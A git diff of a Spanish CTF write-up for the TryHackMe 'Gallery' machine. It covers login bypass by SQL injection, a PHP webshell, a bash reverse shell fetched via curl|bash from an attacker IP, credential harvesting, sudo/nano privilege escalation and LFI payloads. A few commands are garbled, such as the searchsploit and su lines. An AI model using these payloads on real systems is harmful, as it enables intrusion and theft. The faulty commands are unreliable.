@@ -30,32 +30,37 @@ tags:
 
 ![](/assets/images/thm-writeup-gallery/logo_gal.png)
 
-"Mediante la vulnerabilidad web conocida como SQLI, nos saltaremos la autenticación de un Login y ingresaremos a la cuenta de <span style="color:blue">Administrator</span>. Ahí, veremos un apartado para subir fotos a una album, que mediante Fuzzing descubriremos la ruta de donde se aloja. Subiremos una webshell en .php, ya que no valida los tipos de archivos que se suben ganando una ejecución remota de comandos (RCE). Para ganar privilegios abusaremos de nuestros permisos de sudo con "nano". Tendremos que encontrar antes la contraseña del usuario para listar."
+
 
 ## WRITE UP
 IP VÍCITMA-> 10.67.170.17  (TTL 63) LINUX
 
 
-#### RECONOCIMIENTO
+### RECONOCIMIENTO
 
 Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Gallery</span>
 
 Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**
 
->**which** mkt.py | **xargs** **batcat** -l python
-
-*Ver en que ubicación está una herramienta y ver su código*
-*Adelante explicamos a tener batcat, que es un cat pero con esteroides*
 
 
 Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:
 
 -Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.
 
+```bash
+whichSystem.py 10.67.170.17
+```
+
 ![](/assets/images/thm-writeup-gallery/whichsystem_gal.png)
 
 
--Usar el comando *ping* <span style="color:red">10.67.170.17</span> <span style="color:yellow">-c</span> 1  <span style="color:yellow">-R</span>
+-Usar el comando *ping*:
+
+```bash
+ping 10.67.170.17 -c1 -R
+```
+
 *-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición*
 
 ![](/assets/images/thm-writeup-gallery/conectividad_gal.png)
@@ -64,8 +69,10 @@ Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:
 
 Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.
 
+```bash
+nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.67.170.17 -oG allPorts
+```
 
-**nmap** <span style="color:yellow">-p- --open -Pn -vvv -n -sS --min-rate 5000</span> <span style="color:red">10.67.170.17</span> <span style="color:yellow">-oG</span> <span style="color:pink">allPorts</span>
 *Veremos porque el formato grapeable, es importante.*
 
 ![](/assets/images/thm-writeup-gallery/nmap1_gal.png)
@@ -74,10 +81,17 @@ Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que
 Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
 cual nos copiara los puertos, y escanearlos con nmap. 
 
+```bash
+extractports.sh allPorts
+```
+
 ![](/assets/images/thm-writeup-gallery/extractport_gal.png)
 
 
-**nmap** <span style="color:yellow">-sVC</span>  <span style="color:yellow">-p</span><span style="color:purple">22,80,8080</span> <span style="color:red">10.67.170.17</span> <span style="color:yellow">-oN</span> <span style="color:pink">targeted</span> 
+ ```bash
+nmap -sVC -p22,80,8080 10.67.170.17 -oN targeted
+```
+
 *Este formato lo emplearemos con batcat lenguaje java para verlo mejor*
 *Nos mostrará la versión de los servicios que están corriendo*
 *Usará scripts defaults*
@@ -88,35 +102,39 @@ cual nos copiara los puertos, y escanearlos con nmap.
 Una vez escaneado, usaremos batcat:
 >https://github.com/sharkdp/bat.git
 
-**batcat** <span style="color:pink">target</span> <span style="color:yellow">-l</span> <span style="color:orange">java</span>
-*nos mostrara la salida en un formato más bonito, con java
+```bash
+batcat targeted -l java
+```
 
 ![](/assets/images/thm-writeup-gallery/batcat_gal.png)
 
-**El httponly esta desactivado, eso quiere decir que podemos manipular cookies.
 
-#### ANÁLISIS SSH: RECONOCIMIENTO
+
+### ANÁLISIS SSH: RECONOCIMIENTO
 
 Con *searchsploit* buscaremos si la versión del **SSH** es vulnerable pero como es común encontrarse con esta versión, nunca es.
 
-**searchsploit** <span style="color:yellow">openssh 8.2p1</span>
+```bash
+searchsploit openssh 8.2p1
+```
 
 ![](/assets/images/thm-writeup-gallery/searchespssh_gal.png)
 
 
-#### ANÁLISIS WEB: RECONOCIMIENTO
+### ANÁLISIS WEB: RECONOCIMIENTO
 
 Haremos un *whatweb* a la página web por el puerto <span style="color:purple">8080</span>, para conocer tecnologías, lenguaje... Ya que el otro puerto es el Default de Apache. Es lo mismo que la extensión <span style="color:lightyellow">Wappalyzer</span> pero por consola.
 
-**whatweb** http://10.67.170.17:8080/
+```bash
+whatweb http://10.67.170.17:8080/
+```
 
 ![](/assets/images/thm-writeup-gallery/whatweb_gal.png)
 
-Hay un formulario y el lenguaje es **PHP**. | 
+Hay un formulario y el lenguaje es **PHP**. 
 
 
-Entramos al a Página:
-Nos saldrá un Login cual de momento no tenemos credenciales.
+Entramos a la página y nos saldrá un Login cual de momento no tenemos credenciales.
 
 ![](/assets/images/thm-writeup-gallery/log_gal.png)
 
@@ -128,8 +146,7 @@ Herramienta para diseños web cual permite visualizar imágenes de forma profesi
 ![](/assets/images/thm-writeup-gallery/simpleimgall_gal.png)
 
 
-##### POSIBLES EXPLOTACIONES A NIVEL WEB
-###### SQLI
+### POSIBLES EXPLOTACIONES A NIVEL WEB: SQLI
 
 >Una inyección *SQL* **(Structured Query Language)** es un tipo de ataque en el que se intenta explotar vulnerabilidades en el código de una aplicación insertando una consulta SQL en campos de entrada o formulario regulares, como un nombre de usuario o contraseña.
 
@@ -140,10 +157,10 @@ Podemos ver ejemplos de SQLI básicos en **formularios** de Bases de datos, algu
 
 - Introduciendo en la contraseña `' OR '1'='1` -> esta condición siempre es verdadera, lo que hace que el sistema acepte el acceso sin validar la contraseña real.
 
-Aunque muchas más variaciones estas son las más típicas.
+Aunque muchas más variaciones estas son las más típicas, lo mejor que como el lenguaje es PHP lo hace más vulnerable.
 
 
-#### BUSCAR CREDENCIALES POTENCIALES
+### BUSCAR CREDENCIALES POTENCIALES
 
 Como carecemos de algún nombre o contraseña vamos a mirar por el código fuente, a ver si vemos algo. "**CTRL + U**"
 
@@ -158,16 +175,32 @@ Teniendo esto, no nos da un nombre pero como es para administración, podríamos
 
 ![](/assets/images/thm-writeup-gallery/adminlte_gal.png)
 
-#### SQLI
+### SQLI
 
 ALGUNOS PAYLOADS EXITOSOS:
 
-1) admin`' OR '1'='1' -- -` (cualquier contraseña)
+1) 
+
+```
+# Usuario
+admin' OR '1'='1' -- -
+
+# Contraseña
+(cualquier contraseña)
+```
 
 ![](/assets/images/thm-writeup-gallery/sql1_gal.png)
 
 
-2) admin`'#` (cualquier contraseña)
+2) 
+
+```   
+# Usuario
+admin'#
+
+# Contraseña
+(cualquier contraseña)
+```
 
 ![](/assets/images/thm-writeup-gallery/sql2_gal.png)
 
@@ -192,20 +225,24 @@ Si recordamos en la página del admin, salía un apartado de "Albums". Cual lo m
 ![](/assets/images/thm-writeup-gallery/almuser_gal.png)
 
 
-##### SEARCHSPLOIT
+### SEARCHSPLOIT: Simple Image Gallery
 
 Si hubiésemos usado *searchsploit* para buscar "<span style="color:yellow">Simple Image Gallery</span>", nos hubiese salido las vulnerabilidades que tiene por versión.
 
 En este caso si nos fijamos en el panel a abajo izquierda, tiene la <span style="color:yellow">v1.0</span> cual permite *SQLI* y *ejecución remota de comandos* (**Remote Code Execution**)
 
-**searchsploit** <span style="color:yellow">Simple Image Gallery</span>
+```bash
+searchsploit Simple Image Gallery
+```
 
 ![](/assets/images/thm-writeup-gallery/searchespcms_gal.png)
 
 
 Vamos a mirar el código:
 
-**searchsploit** <span style="color:yellow">openssh 8.2p1</span> <span style="color:green">-x</span>  php/webapps/<span style="color:lime">50214.py</span>
+```bash
+searchsploit openssh 8.2p1 -x php/webapps/50214.py
+```
 
 ![](/assets/images/thm-writeup-gallery/miraresp_gal.png)
 
@@ -227,11 +264,13 @@ Donde se aloja una serie de fotos por álbumes.
 ![](/assets/images/thm-writeup-gallery/apartwe_gal.png)
 
 
-#### FUZZING: DESCUBRIMIENTO DIRECTORIOS NIVEL WEB
+### FUZZING: DESCUBRIMIENTO DIRECTORIOS NIVEL WEB
 
 Haremos Fuzzing con *ffuf* para saber en que directorio web se alojan estas fotos.
 
-**ffuf** <span style="color:green">-c  -t</span>  200  <span style="color:green">-w</span>  <span style="color:lightblue">/usr/share/wordlists/SecLists/Discovery/Web-Content/</span>big.txt <span style="color:green">-u</span>  http://10.65.178.201/gallery/FUZZ/ <span style="color:green">-fc</span> 404 <span style="color:green">-mc </span> 200,302,403,401
+```bash
+ffuf -c -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.65.178.201/gallery/FUZZ/ -fc 404 -mc 200,302,403,401
+```
 
 Entre estas, destaca <span style="color:lightblue">/uploads/</span> que es el directorio donde habíamos visto previamente, y estos álbumes alojados en <span style="color:lightblue">/user_1/</span>  con sus respectivas fotos.
 
@@ -246,7 +285,7 @@ Nos metemos en "<span style="color:lightblue">/Album_2/</span>" y nos saldrá un
 ![](/assets/images/thm-writeup-gallery/comp1_gal.png)
 
 
-#### FILE UPLOAD: WEBSHELL
+### FILE UPLOAD: WEBSHELL
 
 Como podemos ver la foto de "**album_2**" que corresponde con la de "**Sample Images**".
 Encima al tener privilegios a nivel web podemos subir archivos.
@@ -257,6 +296,10 @@ Vamos a ver si nos valida al extensión <span style="color:grey">.php</span> .
 
 
 Crearemos una <span style="color:lime">webshell</span> para poder ejecutar comandos en caso de que funcione, por el parámetro ?**cmd**<span style="color:orange">=</span> . Jugaremos con etiquetas preformateadas para verlo mejor.
+
+```php
+<?php echo '<pre>' . system($_GET["cmd"]) . '<pre>'; ?>
+```
 
 ![](/assets/images/thm-writeup-gallery/webshell_gal.png)
 
@@ -275,7 +318,7 @@ Subiéndose exitosamente la <span style="color:lime">webshell</span>.
 
 ![](/assets/images/thm-writeup-gallery/succs_gal.png)
 
-###### EJECUCIÓN WEBSHELL: RCE
+### EJECUCIÓN WEBSHELL: RCE
 
 Para ejecutarla, nos iremos a la ruta del album_2, y como tienen una **id** asignada cada archivo, veremos la de la *webshell* y seguiremos esta sintaxis en la URL:
 
@@ -291,43 +334,51 @@ Nos dará salida teniendo una ejecución de comandos exitosa.
 ![](/assets/images/thm-writeup-gallery/rce_gal.png)
 
 
-#### CONFIGURACIÓN NETCAT: REVERSHELL
+### CONFIGURACIÓN NETCAT: REVERSHELL
 
 Ahora nos daremos una <span style="color:lime">Reverseshell</span>.
 
 Lo primero será configurar nuestro *netcat* para recibir el host para victima para cuando enviemos la revershell, nos pondremos en escucha por el puerto <span style="color:purple">443</span>.
 
-**nc** <span style="color:yellow">-nvlp</span> <span style="color:purple">443</span> 
+```bash
+nc -nvlp 443
+```
 
 ![](/assets/images/thm-writeup-gallery/nc_gal.png)
 
 
-#### CONFIGURACIÓN REVERSHELL
+### CONFIGURACIÓN REVERSHELL
 
 Meteremos la línea de <span style="color:lime">revershell</span> en un archivo **.sh** para ejecutarlo en bash como script.
 Apuntara a nuestra IP atacante y al puerto en escucha que pusimos.
 
-**echo** ``'bash -i >& /dev/tcp/IPatacante/PUERTOatacante 0>&1'``
+```bash
+echo 'bash -i >& /dev/tcp/192.168.158.89/443 0>&1' > shell.sh
+```
 
 ![](/assets/images/thm-writeup-gallery/confbas_gal.png)
 
 
-#### CONFIGURACIÓN SERVIDOR HTTP
+### CONFIGURACIÓN SERVIDOR HTTP
 
 Nos abrimos un **servidor http con python3** para que ejecutar un comando que se descargue el la shell.sh y ejecutarla.
 
-**Python3** <span style="color:yellow">-m</span> *http.server* <span style="color:purple">8000</span>
+```bash
+Python3 -m http.server 8000
+```
 
 ![](/assets/images/thm-writeup-gallery/pyser_gal.png)
 
 
-#### EJECUTAR REVERSHELL
+### EJECUTAR REVERSHELL
 
 Ahora nos vamos a la página y ejecutaremos la rever shell de la siguiente forma:
 
 Con **curl** nos descargaremos de nuestro servidor http el script **shell.sh** que esta abierto en esa ruta de donde se aloja. y al final lo concatenaremos un una tubería para que de forma paralela se ejecute en bash.
 
-<span style="color:lime">1769202660.php</span>?**cmd**<span style="color:orange">=</span>curl<span style="color:orange">%20</span>http://192.168.158.89:8000/shell.sh|bash
+```bash
+1769202660.php?cmd=curl%20http://192.168.158.89:8000/shell.sh|bash
+```
 
 ![](/assets/images/thm-writeup-gallery/ejecrevs_gal.png)
 
@@ -340,22 +391,23 @@ Estaremos como <span style="color:blue">www-data</span>.
 ![](/assets/images/thm-writeup-gallery/revshellhos_gal.png)
 
 
-#### SHELL INTERACTIVA | TRATAMIENTO STTY
+### TRATAMIENTO DE LA TTY
 
-1) **script** <span style="color:lightblue">/dev/null</span> <span style="color:green">-c</span> bash
+1) ```script /dev/null -c bash```
 
 ![](/assets/images/thm-writeup-gallery/tt1_gal.png)
 
-2) **CTRL + Z**
+2) ```CTRL + Z```
 
 ![](/assets/images/thm-writeup-gallery/tty2_gal.png)
 
-3) **stty** <span style="color:yellow">raw</span> <span style="color:green">-echo</span><span style="color:orange">;</span> <span style="color:yellow">fg</span>
-4) **reset** <span style="color:orange">xterm</span>
+3) ```stty raw -echo; fg```
+
+4) ```reset xterm```
 
 ![](/assets/images/thm-writeup-gallery/ty3_gal.png)
 
-5) Esperamos, y **export** <span style="color:orange">TERM=xterm</span>
+5) Esperamos, y ```export TERM=xterm```
 
 ![](/assets/images/thm-writeup-gallery/tty4_gal.png)
 
@@ -364,7 +416,7 @@ Y ya tendremos una shell interactiva.
 ![](/assets/images/thm-writeup-gallery/tty5_gal.png)
 
 
-#### BUSCA CREDENCIALES
+### BUSCA CREDENCIALES
 
 Nos iremos a la siguiente ruta <span style="color:lightblue">/var/www/html/gallery</span> cual listaremos "**ls**", haber que se aloja allí.
 
@@ -380,31 +432,40 @@ credenciales: <span style="color:blue">gallery_user</span>:<span style="color:da
 Para saber de que Base de datos se trata, miraremos los puertos corriendo en local.
 Se trata del <span style="color:purple">3306</span> cual es un *MariaDB*.
 
-**ss** <span style="color:yellow">-tulnp</span>
+```bash
+ss -tulnp
+```
 
 ![](/assets/images/thm-writeup-gallery/listpuert_gal.png)
 
 
-#### ACCESO A MariaDB: HASH ADMINISTRATOR
+### ACCESO A MariaDB: HASH ADMINISTRATOR
 
-1) **mysql** <span style="color:yellow">-u</span> <span style="color:blue">root</span>  <span style="color:yellow">-h</span>  <span style="color:red">10.65.178.201</span> / error
+1) Error
+```bash
+mysql -u root -h 10.65.178.201
+```
 
 ![](/assets/images/thm-writeup-gallery/error1_gal.png)
 
 
-2) **mysql** <span style="color:yellow">-u</span> <span style="color:blue">root</span>  <span style="color:yellow">-p</span>  /  Usuarios por defecto: "root" or "localhost" tienen acceso denegado a la base de datos.
+2) Usuarios por defecto: "root" or "localhost" tienen acceso denegado a la base de datos.
+```bash
+mysql -u root -p 
+```
 
 ![](/assets/images/thm-writeup-gallery/error2_gal.png)
 
 
-3) **mysql** <span style="color:yellow">-u</span> <span style="color:blue">gallery_user</span>  <span style="color:yellow">-p</span>  / Entramos con las credenciales encontrados.
-
-credenciales: <span style="color:blue">gallery_user</span>:<span style="color:darkred">passw0rd321</span>
+3) Entramos con las credenciales encontrados; <span style="color:blue">gallery_user</span>:<span style="color:darkred">passw0rd321</span>
+```bash
+mysql -u gallery_user -p
+```
 
 ![](/assets/images/thm-writeup-gallery/acces_gal.png)
 
 
-###### COMANDOS
+### COMANDOS
 Para mostrar las bases de datos disponibles: <span style="color:lightyellow">show</span> **databases**<span style="color:orange">;</span>
 
 Nos interesa la base de datos <span style="color:gold">gallery_db</span>.
@@ -439,7 +500,9 @@ Para salir usamos:
 
 Leeremos el fichero <span style="color:lightblue">/etc/</span><span style="color:grey">passwd</span> para ver que ususarios tienen bash y a cual podríamos acceder.
 
-**cat**  <span style="color:lightblue">/etc/</span><span style="color:grey">passwd</span> | **grep** sh<span style="color:orange">$</span>
+```bash
+cat /etc/passwd | grep sh$
+```
 
 ![](/assets/images/thm-writeup-gallery/usuariosbash_gal.png)
 
@@ -449,7 +512,7 @@ Leeremos el fichero <span style="color:lightblue">/etc/</span><span style="color
 ![](/assets/images/thm-writeup-gallery/accesdenie_gal.png)
 
 
-#### CREDENCIALES  DEL USER MIKE
+### CREDENCIALES DEL USER MIKE
 
 En el directorio <span style="color:lightblue">/var/backups/</span>, veremos un directorio llamado <span style="color:lightblue">mike_home_backup</span>, nos metemos.
 
@@ -465,26 +528,38 @@ En el directorio <span style="color:lightblue">documents</span> habrá una nota 
 Vamos a leer su historial del bash, haber que comandos puso en su sesión.
 Vemos una contraseña -> <span style="color:darkred">b3stpassw0rdbr0xx</span>
 
+```bash
+cat .bash_history
+```
+
 ![](/assets/images/thm-writeup-gallery/contraselek_gal.png)
 
 
 Probamos las credenciales y son correctas.
 
-**su** <span style="color:blue">mike</span>:<span style="color:darkred">b3stpassw0rdbr0xx</span>
+```bash
+su mike:b3stpassw0rdbr0xx
+```
 
 ![](/assets/images/thm-writeup-gallery/convu_gal.png)
 
 
-#### ACCESO SSH Y BANDERA USER
+### ACCESO SSH Y BANDERA USER
 
 Como tenemos las credenciales de mike, y el servicio *ssh* abierto, vamos a loguearnos en dicho servicio.
 
-**ssh** <span style="color:blue">mike</span><span style="color:lime">@10.65.178.201</span> 
+```bash
+ssh mike@10.65.178.201 
+```
 
 ![](/assets/images/thm-writeup-gallery/logssh_gal.png)
 
 
-(opcional)
+Tratamiento TTY en ssh.
+
+```bash
+export TERM=xterm
+```
 
 ![](/assets/images/thm-writeup-gallery/export_gal.png)
 
@@ -494,12 +569,13 @@ En el <span style="color:lightblue">/home/mike</span> leemos la bandera de usuar
 ![](/assets/images/thm-writeup-gallery/flaguser_gal.png)
 
 
-#### ESCALADA DE PRIVILEGIOS
-###### PERMISOS SUDO: (script) ROOTKIT.SH
+### ESCALADA DE PRIVILEGIOS: ABUSE SUDOERS PRIVILEGE - (script) ROOTKIT.SH
 
 Listamos nuestros permisos de *sudo* disponibles como usuario para ver si tenemos algún privilegio de cual aprovecharnos.
 
-**sudo -l**
+```bash
+sudo -l
+```
 
 Nos lista uno que no pide contraseña y que es de root. Podemos usar **bash** como <span style="color:blue">root</span> para el ejecutar el script en bash "<span style="color:lime">rootkit.sh</span>" en el directorio <span style="color:lightblue">/opt/</span>.
 
@@ -508,24 +584,34 @@ Nos lista uno que no pide contraseña y que es de root. Podemos usar **bash** co
 
 Nos metemos a la ruta y vemos que el script pertenece al usuario y grupo de <span style="color:blue">root</span>.
 
+```bash
+ls -l
+o
+ll
+```
+
 ![](/assets/images/thm-writeup-gallery/dueno_gal.png)
 
 
 Vamos a leer que contiene:
 
-**cat** <span style="color:lime">rootkit.sh</span>
+```bash
+cat rootkit.sh
+```
 
 ![](/assets/images/thm-writeup-gallery/instruccscrip_gal.png)
 
 >**Para administrar la herramienta de seguridad rkhunter**, permitiendo al usuario **elegir qué acción ejecutar** desde la terminal: comprobar la versión instalada (_versioncheck_), **actualizar la base de datos** (_update_), **listar configuraciones o datos** (_list_) o **leer el reporte generado** (_read_), todo mediante un menú simple que ejecuta el comando correspondiente según la opción ingresada
 
 
-Para ejecutar el script: **sudo** <span style="color:lightblue">/bin/</span><span style="color:grey">bash</span> <span style="color:lightblue">/opt/</span><span style="color:lime">rootkit.sh</span>  | Escogeremos la opción "**read**" ya que usa el editor nano sobre un fichero y puede ser una vía potencial para escalar privilegios.
+Para ejecutar el script: ```sudo /bin/bash /opt/rootkit.sh```
+
+Escogeremos la opción "**read**" ya que usa el editor nano sobre un fichero y puede ser una vía potencial para escalar privilegios.
 
 ![](/assets/images/thm-writeup-gallery/readopt_gal.png)
 
 
-###### SHELL ROOT: NANO
+### SHELL ROOT: NANO
 
 Nos ayudaremos del repositorio online: [GTF Obins](https://gtfobins.org/)
 
@@ -550,22 +636,23 @@ Exitosamente hemos escalado privilegios.
 
 Para darnos la shell completa:
 
-**bash  -p**
+```bash
+bash  -p
+```
 
 ![](/assets/images/thm-writeup-gallery/bashroot_gal.png)
 
 
-#### BANDERA ROOT
+### BANDERA ROOT
 
-Para coger la bandera de <span style="color:blue">root</span> a su home <span style="color:lightblue">/root/</span> y la leeremos. "**cat**"
+Para coger la bandera de <span style="color:blue">root</span>, nos vamos a su home <span style="color:lightblue">/root/</span> y la leeremos. "**cat**"
 
 ![](/assets/images/thm-writeup-gallery/flagroot_gal.png)
 
-
-
-
-##### COSAS EXTRAS
-###### POSIBLE LFI
+<hr>
+<br>
+### COSAS EXTRAS
+### POSIBLE LFI
 
 En la página podríamos haber probado en los parámetros cosas de este estilo para ver si carga elementos externos nivel local, en caso de estar mal sanitizado, pro no funcionan. 
 
@@ -584,7 +671,7 @@ page=..//..//..//..//etc//passwd
 ![](/assets/images/thm-writeup-gallery/lfi3_gal.png)
 
 
-###### STORED XSS (CROSS SITE-SCRIPTING)
+### POSIBLE COOKIE HIJACKING + STORED XSS (CROSS SITE-SCRIPTING)
 
 Si nos vamos a las cookies de sesión desde la **DEV TOOLS** vemos que esta en **FALSE**:
 
